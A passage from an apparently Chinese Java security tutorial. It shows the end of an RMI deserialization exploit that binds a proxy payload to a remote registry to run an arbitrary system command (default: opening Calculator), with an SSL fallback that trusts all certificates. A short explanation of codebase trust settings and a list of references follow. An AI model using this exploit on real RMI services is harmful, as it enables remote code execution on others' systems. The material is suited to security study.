        Remote remote = (Remote) Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, annHandler
        );
        try {
            // 发送 Payload
            registry.bind(name, remote);
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            // 如果不指定连接参数默认连接本地 RMI 服务
            args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), "open -a Calculator.app"};
        }
        // 远程 RMI 服务IP
        final String host = args[0];
        // 远程 RMI 服务端口
        final int port = Integer.parseInt(args[1]);
        // 需要执行的系统命令
        final String command = args[2];
        // 获取远程 Registry 对象的引用
        Registry registry = LocateRegistry.getRegistry(host, port);
        try {
            // 获取 RMI 服务注册列表(主要是为了测试RMI连接是否正常)
            String[] regs = registry.list();
            for (String reg : regs) {
                System.out.println("RMI:" + reg);
            }
        } catch (ConnectIOException ex) {
            // 如果连接异常尝试使用 SSL 建立 SSL 连接,忽略证书信任错误，默认信任 SSL 证书
            registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
        }
        // 执行 payload
        exploit(registry, command);
    }
}
```








RMI 存在动态类加载行为，即会先从本地 CLASSPATH 加载，如无则请求 codebase 加载。JDK `6u132`、`7u122`、`8u113` 之后，系统属性 `com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为 `false`，无法再通过直接的 JNDI naming reference + RMI 达成攻击，需 `System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true")`。










**- 参考 -**

\[1\] [Learn X in Y minutes](https://learnxinyminutes.com/docs/zh-cn/java-cn/)

\[2\] [攻击 Java Web 应用 - [Java Web 安全]](https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925)

\[3\] [ClassLoader in Java](https://www.geeksforgeeks.org/classloader-in-java/)

\[4\] [Java Security](http://iv4n.cc/java-sec/)

\[5\] [JAVA 安全基础（一）--类加载器（ClassLoader）](https://xz.aliyun.com/t/9002)

\[6\] [Java 魔法类：Unsafe 应用解析](https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html)

\[7\] [JAVA 反序列化 - Commons-Collections 组件](https://xz.aliyun.com/t/7031)

\[8\] [Java安全之RMI反序列化](https://xz.aliyun.com/t/9053)



